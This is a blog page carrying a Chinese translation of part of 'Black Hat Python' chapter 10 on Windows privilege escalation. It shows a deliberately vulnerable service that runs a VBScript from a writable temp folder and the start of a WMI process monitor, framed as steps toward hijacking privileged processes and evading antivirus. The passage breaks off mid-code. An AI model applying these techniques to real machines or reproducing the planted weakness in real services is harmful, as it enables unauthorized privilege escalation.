<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Black Hat Python 2nd 10 | Ma9icCR</title><meta name="description" content="WINDOWS PRIVILEGE ESCALATION – Windows 权限提升目前你成功进入到一个有趣的 Windows 网络中。也许你利用了远程堆溢出，或者你利用网络钓鱼进入。是时候开始寻找提升特权的方法了。 即使您已经以系统管理员或管理员的身份运行，您也可能希望有多几种方法来获得这些权限，以防补丁程序周期终止您的访问。在您的背包中有一个特权提升目录也很重要，因为一些企业运行的软件可能很"><meta name="keywords" content="Black_Hat_Python_2nd"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-10/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Black Hat Python 2nd 10"><meta property="og:url" content="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-10/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="WINDOWS PRIVILEGE ESCALATION – Windows 权限提升目前你成功进入到一个有趣的 Windows 网络中。也许你利用了远程堆溢出，或者你利用网络钓鱼进入。是时候开始寻找提升特权的方法了。 即使您已经以系统管理员或管理员的身份运行，您也可能希望有多几种方法来获得这些权限，以防补丁程序周期终止您的访问。在您的背包中有一个特权提升目录也很重要，因为一些企业运行的软件可能很"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><meta property="article:published_time" content="2021-07-20T05:06:41.000Z"><meta property="article:modified_time" content="2022-03-28T07:20:45.505Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="Black Hat Python 2nd 11" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-11/"><link rel="next" title="Black Hat Python 2nd 9" href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-9/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-03-28 15:20:45'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">34</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">11</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WINDOWS-PRIVILEGE-ESCALATION-–-Windows-权限提升"><span class="toc-number">1.</span> <span class="toc-text">WINDOWS PRIVILEGE ESCALATION – Windows 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装准备工具"><span class="toc-number">1.1.</span> <span class="toc-text">安装准备工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建脆弱的黑帽服务"><span class="toc-number">1.2.</span> <span class="toc-text">创建脆弱的黑帽服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建进程监视器"><span class="toc-number">1.3.</span> <span class="toc-text">创建进程监视器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用-WMI-监控进程"><span class="toc-number">1.4.</span> <span class="toc-text">使用 WMI 监控进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires"><span class="toc-number">1.4.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows令牌权限"><span class="toc-number">1.5.</span> <span class="toc-text">Windows令牌权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Winning-the-Race–赢得比赛"><span class="toc-number">1.6.</span> <span class="toc-text">Winning the Race–赢得比赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-1"><span class="toc-number">1.6.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码注入"><span class="toc-number">1.7.</span> <span class="toc-text">代码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kicking-the-Tires-2"><span class="toc-number">1.7.1.</span> <span class="toc-text">Kicking the Tires</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Black Hat Python 2nd 10</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2021-07-20 13:06:41"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2021-07-20</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-03-28 15:20:45"><i class="fas fa-history fa-fw"></i> 更新于 2022-03-28</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/books/">books</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="WINDOWS-PRIVILEGE-ESCALATION-–-Windows-权限提升"><a href="#WINDOWS-PRIVILEGE-ESCALATION-–-Windows-权限提升" class="headerlink" title="WINDOWS PRIVILEGE ESCALATION – Windows 权限提升"></a>WINDOWS PRIVILEGE ESCALATION – Windows 权限提升</h1><p>目前你成功进入到一个有趣的 Windows 网络中。也许你利用了远程堆溢出，或者你利用网络钓鱼进入。是时候开始寻找提升特权的方法了。</p>
<p>即使您已经以系统管理员或管理员的身份运行，您也可能希望有多几种方法来获得这些权限，以防补丁程序周期终止您的访问。在您的背包中有一个特权提升目录也很重要，因为一些企业运行的软件可能很难在您自己的环境中进行分析，并且您可能无法运行该软件，除非您在相同规模或构成情况的企业网络中。</p>
<p>在典型的权限提升中，您会利用脆弱编码的驱动程序或本机 Windows 内核问题，但是如果您使用低质量的利用或在利用过程中出现问题，您将面临导致系统不稳定的风险。让我们探索一些在 Windows 上获得提升权限的其他方法。大型企业中的系统管理员通常会安排执行子进程的任务或服务，或者运行 VBScript 或 PowerShell 脚本来自动化运行。供应商也经常会设置自动化的内置任务，它们的行为方式相同。我们将尝试利用任何高特权进程来处理文件或执行低特权用户可写的二进制文件。您有无数种方法可以尝试提升 Windows 上的权限，我们将只介绍其中的几种。但是，当您理解这些核心概念时，您可以扩展您的脚本去开始探索目标 Windows 系统上的其他暗处的角落。</p>
<p>我们将从学习如何应用 Windows Management Instrumentation (WMI) 编程创建一个灵活的界面以监控创建新进程开始。我们将获得有用的数据，如文件路径、创建进程的用户和启用的权限。然后，我们将所有文件路径交给一个文件监控脚本，该脚本持续跟踪记录所有新创建的文件，以及写入这些文件的内容。这就会告诉我们高特权进程正在访问哪些文件。最后，我们将通过向文件中注入我们自己的脚本代码来拦截文件创建过程，并使高特权进程执行一个 command shell 。这整个过程的美妙之处在于，它不涉及任何 API hook ，因此我们可以在大多数防病毒软件的雷达下飞行(笔者注：应该是比喻修辞手法)。</p>
<h2 id="安装准备工具"><a href="#安装准备工具" class="headerlink" title="安装准备工具"></a>安装准备工具</h2><p>我们需要安装一些库来编写本章中的工具。</p>
<p>在 Windows 的 <em>cmd.exe</em> shell 中执行以下操作:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>&gt; <span class="title">pip</span> <span class="title">install</span> <span class="title">pywin32</span> <span class="title">wmi</span> <span class="title">pyinstaller</span></span></span><br></pre></td></tr></table></figure>

<p>当你在第8章制作键盘记录器和截图器时，你可能已经安装了 <em>pyinstaller</em> ，但是如果没有安装，现在安装它(你可以使用 <em>pip</em> )。接下来，我们将创建用于测试监控脚本的示例服务。</p>
<h2 id="创建脆弱的黑帽服务"><a href="#创建脆弱的黑帽服务" class="headerlink" title="创建脆弱的黑帽服务"></a>创建脆弱的黑帽服务</h2><p>我们正在创建的服务模拟了大型企业网络中常见的一组漏洞。我们将在本章后面对它攻击测试。此服务将定期将脚本复制到临时目录，并从该目录执行它。打开 <em>bhservice.py</em> 开始编码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> servicemanager</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32event</span><br><span class="line"><span class="keyword">import</span> win32service</span><br><span class="line"><span class="keyword">import</span> win32serviceutil</span><br><span class="line">SRCDIR = <span class="string">'C:\\Users\\tim\\work'</span></span><br><span class="line">TGTDIR = <span class="string">'C:\\Windows\\TEMP'</span></span><br></pre></td></tr></table></figure>

<p>在这里，我们进行导入，设置了脚本文件的源目录，然后设置了服务运行它的目标目录。现在，我们使用一个类来创建真实的服务:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BHServerSvc</span><span class="params">(win32serviceutil.ServiceFramework)</span>:</span></span><br><span class="line">    _svc_name_ = <span class="string">"BlackHatService"</span></span><br><span class="line">    _svc_display_name_ = <span class="string">"Black Hat Service"</span></span><br><span class="line">    _svc_description_ = (<span class="string">"Executes VBScripts at regular intervals."</span> +</span><br><span class="line">                            <span class="string">" What could possibly go wrong?"</span>)</span><br><span class="line">[<span class="number">1</span>] <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,args)</span>:</span></span><br><span class="line">        self.vbs = os.path.join(TGTDIR, <span class="string">'bhservice_task.vbs'</span>)</span><br><span class="line">        self.timeout = <span class="number">1000</span> * <span class="number">60</span></span><br><span class="line">        win32serviceutil.ServiceFramework.__init__(self, args)</span><br><span class="line">        self.hWaitStop = win32event.CreateEvent(<span class="literal">None</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line">[<span class="number">2</span>] <span class="function"><span class="keyword">def</span> <span class="title">SvcStop</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)</span><br><span class="line">        win32event.SetEvent(self.hWaitStop)</span><br><span class="line">[<span class="number">3</span>] <span class="function"><span class="keyword">def</span> <span class="title">SvcDoRun</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ReportServiceStatus(win32service.SERVICE_RUNNING)</span><br><span class="line">        self.main()</span><br></pre></td></tr></table></figure>

<p>这个类是任何服务必须准备的框架。它继承自 <em>win32serviceutil.ServiceFramework</em> 并定义了三个类函数。在 __init__ 函数中我们初始化框架，定义要运行的脚本的位置，设置一分钟的超时限制，并创建事件对象[1]。在 <em>SvcStop</em> 函数中，我们设置服务状态并停止服务[2]。在 <em>SvcDoRun</em> 函数中，我们启动服务并调用我们的任务将在其中运行的 <em>main</em> 函数[3]。接下来我们定义 <em>main</em> 函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ret_code = win32event.WaitForSingleObject(</span><br><span class="line">        self.hWaitStop, self.timeout)</span><br><span class="line">    [<span class="number">2</span>] <span class="keyword">if</span> ret_code == win32event.WAIT_OBJECT_0:</span><br><span class="line">            servicemanager.LogInfoMsg(<span class="string">"Service is stopping"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        src = os.path.join(SRCDIR, <span class="string">'bhservice_task.vbs'</span>)</span><br><span class="line">        shutil.copy(src, self.vbs)</span><br><span class="line">    [<span class="number">3</span>] subprocess.call(<span class="string">"cscript.exe %s"</span> % self.vbs, shell=<span class="literal">False</span>)</span><br><span class="line">        os.unlink(self.vbs)</span><br></pre></td></tr></table></figure>

<p>在 <em>main</em> 函数中，由于 <em>self.timeout</em> 参数，我们设置了一个每分钟运行的循环，直到服务收到停止信号[2]。当它运行时，我们将脚本文件复制到目标目录，执行脚本，并删除文件[3]。</p>
<p>在主模块中，我们会处理所有命令行参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        servicemanager.Initialize()</span><br><span class="line">        servicemanager.PrepareToHostSingle(BHServerSvc)</span><br><span class="line">        servicemanager.StartServiceCtrlDispatcher()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        win32serviceutil.HandleCommandLine(BHServerSvc)</span><br></pre></td></tr></table></figure>

<p>有时您可能想要在受害机器上创建一个真实的服务。这个框架为你提供了一个如何构建框架的纲要。</p>
<p>您可以在 <a href="https://nostarch.com/black-hat-python2E/" target="_blank" rel="noopener">https://nostarch.com/black-hat-python2E/</a> 找到 <em>bhservice_tasks.vbs</em> 脚本。将文件放在 <em>bhservice.py</em> 的同目录下，并将 <em>SRCDIR</em> 更改为指向该目录。您的目录应该如下所示:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">06</span>/<span class="number">22</span>/<span class="number">2020</span>  <span class="number">09</span>:<span class="number">02</span> AM      &lt;<span class="built_in">DIR</span>&gt;               .</span><br><span class="line"><span class="number">06</span>/<span class="number">22</span>/<span class="number">2020</span>  <span class="number">09</span>:<span class="number">02</span> AM      &lt;<span class="built_in">DIR</span>&gt;               ..</span><br><span class="line"><span class="number">06</span>/<span class="number">22</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">26</span> AM                   <span class="number">2</span>,<span class="number">099</span>   bhservice.py</span><br><span class="line"><span class="number">06</span>/<span class="number">22</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">08</span> AM                   <span class="number">2</span>,<span class="number">501</span>   bhservice_task.vbs</span><br></pre></td></tr></table></figure>

<p>现在使用 <em>pyinstaller</em> 创建可运行的服务程序:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>&gt; <span class="title">pyinstaller</span> -<span class="title">F</span> --<span class="title">hiddenimport</span> <span class="title">win32timezone</span> <span class="title">bhservice.py</span></span></span><br></pre></td></tr></table></figure>

<p>该命令将 <em>bservice.exe</em> 文件保存在 <em>dist</em> 子目录中。让我们转到该目录来安装服务并启动。以管理员身份运行以下命令:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>\<span class="title">dist</span>&gt; <span class="title">bhservice.exe</span> <span class="title">install</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>\<span class="title">dist</span>&gt; <span class="title">bhservice.exe</span> <span class="title">start</span></span></span><br></pre></td></tr></table></figure>

<p>现在，每分钟服务都会将脚本文件写入临时目录，执行脚本，并删除文件。在您运行 <em>stop</em> 命令之前，它会一直这样做:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">tim</span>\<span class="title">work</span>\<span class="title">dist</span>&gt; <span class="title">bhservice.exe</span> <span class="title">stop</span></span></span><br></pre></td></tr></table></figure>

<p>您可以随时启动或停止服务。请记住，如果您在 <em>bhservice.py</em> 中更改了代码，您必须重新使用 <em>pyinstaller</em> 创建一个新的可运行服务程序，并使用 <code>bhservice update</code> 命令让 Windows 重新加载该服务。当您完成本章中的服务时，请使用 <code>bhservice remove</code> 移除它。</p>
<p>你应该已经完成好了。现在让我们继续下面有趣的部分！</p>
<h2 id="创建进程监视器"><a href="#创建进程监视器" class="headerlink" title="创建进程监视器"></a>创建进程监视器</h2><p>几年前，这本书的作者之一， Justin(贾斯汀) ，为安全提供商 Immunity 的项目 El Jefe 做过贡献。本质来说， El Jefe 是一个非常简单的进程监控系统。该工具旨在帮助防御团队的人员跟踪恶意进程创建和恶意软件的安装过程。</p>
<p>一天，他的同事 Mark Wuergler ,马克·伍尔格勒在咨询时提议他们可以使用 El Jefe 进行攻击:有了它，他们可以监控在目标 Windows 机器上作为系统执行的进程。这将提供对潜在不安全文件处理或子进程创建的监测能力。它成功生效了，他们带着无数特权提升的 bug ，给了他们“王国”的钥匙。</p>
<p>最初的 El Jefe 的主要缺点是它使用了一个注入到每个进程中的 DLL (动态链接库)来拦截对本机 <em>CreateProcess</em> 函数的调用。然后，它使用命名管道与收集客户端通信，收集客户端将进程创建的详细信息转发给日志服务器。不幸的是，大多数防病毒软件也会挂钩 <em>CreateProcess</em> 调用，因此，要么他们将您视为恶意软件，要么您在并行运行防病毒软件与 El Jefe 时存在系统不稳定问题。</p>
<p>我们将以无挂钩的方式重新创建 El Jefe 的一些监控功能，使其面向攻击技术。这将使我们的监控功能可移植，并使我们能够毫无问题地与防病毒软件一起运行。</p>
<h2 id="使用-WMI-监控进程"><a href="#使用-WMI-监控进程" class="headerlink" title="使用 WMI 监控进程"></a>使用 WMI 监控进程</h2><p>Windows 管理工具(Windows Management Instrumentation ，WMI) API (应用编程接口)使程序员能够监控系统的某些事件，然后在这些事件发生时接收回调。我们将利用这个接口在每次创建进程时接收回调，然后记录一些有价值的信息:进程创建的时间、生成进程的用户、启动的可执行文件及其命令行参数、进程 ID 标识和父进程 ID 标识。这将向我们显示由高级特权帐户创建的所有进程，特别是调用外部文件的所有进程，如 VBScript 或批处理脚本。当我们拥有所有这些信息时，我们还将确定进程令牌启动的权限。在某些罕见的情况下，您会发现作为普通用户创建的进程，但被授予了您可以利用的额外的 Windows 权限。</p>
<p>让我们先编写一个非常简单的监控脚本，提供基本的进程信息，然后在此基础上确定启动的权限。这段代码改编自 Python WMI 页面（<a href="http://timgolden.me.uk/python/wmi/tutorial.html" target="_blank" rel="noopener">http://timgolden.me.uk/python/wmi/tutorial.html</a>）。请注意，例如，为了获取由系统创建的高特权进程的信息，您需要以管理员身份运行监控脚本。首先向 <em>process_monitor.py</em> 添加以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32api</span><br><span class="line"><span class="keyword">import</span> win32con</span><br><span class="line"><span class="keyword">import</span> win32security</span><br><span class="line"><span class="keyword">import</span> wmi</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_to_file</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'process_monitor_log.csv'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        fd.write(<span class="string">f'<span class="subst">&#123;message&#125;</span>\r\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">monitor</span><span class="params">()</span>:</span></span><br><span class="line">    head = <span class="string">'CommandLine, Time, Executable, Parent PID, PID, User, Privileges'</span></span><br><span class="line">    log_to_file(head)</span><br><span class="line">[<span class="number">1</span>] c = wmi.WMI()</span><br><span class="line">[<span class="number">2</span>] process_watcher = c.Win32_Process.watch_for(<span class="string">'creation'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">        [<span class="number">3</span>] new_process = process_watcher()</span><br><span class="line">            cmdline = new_process.CommandLine</span><br><span class="line">            create_date = new_process.CreationDate</span><br><span class="line">            executable = new_process.ExecutablePath</span><br><span class="line">            parent_pid = new_process.ParentProcessId</span><br><span class="line">            pid = new_process.ProcessId</span><br><span class="line">        [<span class="number">4</span>] proc_owner = new_process.GetOwner()</span><br><span class="line">            privileges = <span class="string">'N/A'</span></span><br><span class="line">            process_log_message = (</span><br><span class="line">                <span class="string">f'<span class="subst">&#123;cmdline&#125;</span> , <span class="subst">&#123;create_date&#125;</span> , <span class="subst">&#123;executable&#125;</span>,'</span></span><br><span class="line">                <span class="string">f'<span class="subst">&#123;parent_pid&#125;</span> , <span class="subst">&#123;pid&#125;</span> , <span 